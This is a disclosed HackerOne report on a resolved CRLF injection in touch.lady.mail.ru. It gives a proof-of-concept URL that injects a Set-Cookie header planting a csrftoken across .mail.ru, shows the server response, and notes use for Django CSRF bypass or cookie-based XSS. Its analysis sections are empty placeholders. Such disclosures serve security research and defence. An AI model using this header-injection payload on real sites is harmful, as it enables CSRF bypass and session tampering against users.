---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '114198'
original_report_id: '114198'
title: '[touch.lady.mail.ru] CRLF Injection'
team_handle: mailru
created_at: '2016-02-02T18:41:17.805Z'
disclosed_at: '2016-10-06T12:23:14.218Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 7
tags:
- hackerone
---

# [touch.lady.mail.ru] CRLF Injection

## Metadata

- HackerOne Report ID: 114198
- Weakness: 
- Program: mailru
- Disclosed At: 2016-10-06T12:23:14.218Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

PoC:
`https://touch.lady.mail.ru/%0aSet-Cookie:csrftoken=x;domain=.mail.ru;`

HTTP Response:
```
HTTP/1.1 301 Moved Permanently
...
Location: https://lady.mail.ru/
Set-Cookie:csrftoken=x;domain=.mail.ru;
```

Уязвимость может быть использована для обхода CSRF защиты Django сайтов или для эксплуатации XSS через Cookie.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
